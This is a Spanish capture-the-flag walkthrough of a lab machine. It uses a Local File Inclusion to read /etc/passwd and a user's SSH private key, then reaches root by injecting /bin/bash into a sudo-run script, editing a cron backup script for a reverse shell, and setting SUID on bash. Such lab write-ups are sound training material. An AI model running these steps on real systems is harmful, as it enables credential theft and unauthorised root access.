PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

-Login Anonymous está desabilitado

-En el puerto 80 hay un Apache Default web server 

-Hacemos CONTROL + U para ver el código fuente y nos dicen que tenemos que añadir 'team.thm' al /etc/hosts

-Entramos y vemos una web, pero no hay nada interesante

-Hacemos Fuzzing de subdominios con gobuster:
	gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://team.thm --append-domain team
	-Encontramos la siguiente ruta y la añadimos al /etc/hosts: www.team.thm

-Parece ser una web en mantenimiento, hay un link que cuando lo pulsas aparece esta ruta en la URL:
	http://dev.team.thm/script.php?page=teamshare.php

-Parece que se trata de un LFI (Local File Inclusion), ya que a través del parámetro 'page' está listando un archivo interno de la máquina, en este caso 'teamshare.php'. 

-Podemos intentar listar otros archivos de la máquina, listamos el /etc/passwd para confirmar la vulnerabilidad:
	http://dev.team.thm/script.php?page=/etc/passwd
	-Nos lo ha listado

-En este punto podemos intentar listar las claves privadas de los usuarios que hay en la máquina, abusar de un Log Poisoning, abusar del /proc ...

-El Log Poisoning no funciona en esta web ya que no tenemos permisos para listar la ruta de logs de Apache, la cual es: /var/log/apache/access.log

-Intentamos ver la Clave Privada de ssh del usuario dale, la ruta más común dónde se suele ubicar no funciona (/home/dale/.ssh/id_rsa). 

-Hacemos Fuzzing para ver que rutas están disponibles:
	gobuster fuzz -u 'http://dev.team.thm/script.php?page=FUZZ' -w /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --exclude-length 1

-En la siguiente ruta se encuntra el id_rsa del usuario dale:
	http://dev.team.thm/script.php?page=/etc/ssh/sshd_config

-Al ver el contenido de la id_rsa nos damos cuenta que al principio de cada línea se encuentra el carácter especial '#'. Para que funcione hay que quitarlo, lo quitamos con el siguiente comando:
	cat id_rsa | tr -d "#" > id_rsa_dale_clean

-Le damos los permisos necesarios y nos logueamos con ella:
	chmod 0400 id_rsa
	ssh -i id_rsa dale@10.10.59.117


## Escalada de Privilegios

-Somos el usuario dale, hacemos un sudo -l:
	-Tenemos permisos como el usuario 'gyles' bajo el siguiente archivo
	(gyles) /home/gyles/admin_checks

-El archivo 'admin_checks' nos pide una fecha y lo ejecuta directamente como un comando del sistema. Ejecutamos el comando con los permisos del usuario 'gyles' y cuando nos pida la fecha ejecutamos spawneamos una shell:
	sudo -y gyles home/gyles/admin_checks
	Enter Date: /bin/bash

gyles@TEAM:/usr/local

-Ya somos el usuario gyles, vamos a inspeccionar el fichero /home/gyles/.bash_history
	Vemos que está presente el siguiente archivo: /usr/local/bin/main_backup.sh

-El archivo pertenece a root y tienen permisos elevados los usuarios del grupo admin. Vemos que usuarios se encuentran en el grupo admin
	gyles@TEAM: groups
	gyles editor admin

-El usuario gyles tiene permisos elevados sobre el archivo main_backup.sh, lo editamos y nos mandamos una reverse shell ejecutando el archivo:
	-nano main_backup.sh: Escribimos una reverse shell en bash
	-Ejecutamos el fichero: ./main_backup.sh
	-Recibimos la conexión y elevamos la shell con bash -p:
		bash-4.4$ bash -p
		bash-4.4#: whoami
		root

-Otra manera de escalar privilegios: El archivo main_backup.sh ejecuta una tarea cron, por lo que podríamos haber hecho lo mismo y en vez de ejecutar el archivo, esperar a que se ejecute solo. También podríamos haber dado permisos SUID con 'chmod +s /bin/bash' . Esto último no me dejaba si ejecutaba el archivo, pero por medio de la tarea cron si que deja.